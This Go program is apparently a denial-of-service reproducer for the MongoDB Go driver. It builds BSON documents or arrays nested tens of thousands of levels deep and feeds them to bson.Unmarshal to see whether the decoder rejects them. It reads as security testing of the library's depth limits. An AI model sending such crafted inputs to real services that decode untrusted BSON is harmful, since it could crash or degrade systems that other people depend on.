package main

import (
	"encoding/binary"
	"fmt"
	"os"
	"strconv"

	"go.mongodb.org/mongo-driver/v2/bson"
)

// buildNestedDoc builds a BSON binary doc nested `depth` levels deep:
// {"a":{"a":{"a": ... {} }}}
// Single flat pre-allocated buffer, O(depth) - no repeated slice copies.
// Layout: [len0][03,a,00][len1][03,a,00]...[innermost 5 bytes][00]*depth
func buildNestedDoc(depth int) []byte {
	total := 5 + 8*depth
	buf := make([]byte, total) // zero-initialized; trailing terminators are already 0x00
	for k := 0; k < depth; k++ {
		off := k * 7 // each level's own header (len+type+key) is 7 bytes
		lenK := uint32(5 + 8*(depth-k))
		binary.LittleEndian.PutUint32(buf[off:], lenK)
		buf[off+4] = 0x03 // type: document
		buf[off+5] = 'a'
		buf[off+6] = 0x00
	}
	innerOff := depth * 7
	binary.LittleEndian.PutUint32(buf[innerOff:], 5)
	buf[innerOff+4] = 0x00
	return buf
}

// buildNestedArray: identical shape but type 0x04 (array), key "0" - {"a":[[[ ... []]]]}
func buildNestedArray(depth int) []byte {
	total := 5 + 8*depth
	buf := make([]byte, total)
	for k := 0; k < depth; k++ {
		off := k * 7
		lenK := uint32(5 + 8*(depth-k))
		binary.LittleEndian.PutUint32(buf[off:], lenK)
		buf[off+4] = 0x04 // type: array
		buf[off+5] = '0'
		buf[off+6] = 0x00
	}
	innerOff := depth * 7
	binary.LittleEndian.PutUint32(buf[innerOff:], 5)
	buf[innerOff+4] = 0x00
	return buf
}

func main() {
	depth := 50000
	mode := "doc"
	if len(os.Args) > 1 {
		d, err := strconv.Atoi(os.Args[1])
		if err == nil {
			depth = d
		}
	}
	if len(os.Args) > 2 {
		mode = os.Args[2]
	}
	fmt.Fprintf(os.Stderr, "building nested BSON %s, depth=%d\n", mode, depth)
	var data []byte
	if mode == "array" {
		data = buildNestedArray(depth)
	} else {
		data = buildNestedDoc(depth)
	}
	fmt.Fprintf(os.Stderr, "built %d bytes, calling bson.Unmarshal into bson.M...\n", len(data))

	var result bson.M
	err := bson.Unmarshal(data, &result)
	if err != nil {
		fmt.Fprintf(os.Stderr, "got error (safe path): %v\n", err)
		return
	}
	fmt.Fprintf(os.Stderr, "decoded OK (unexpected for large depth)\n")
}
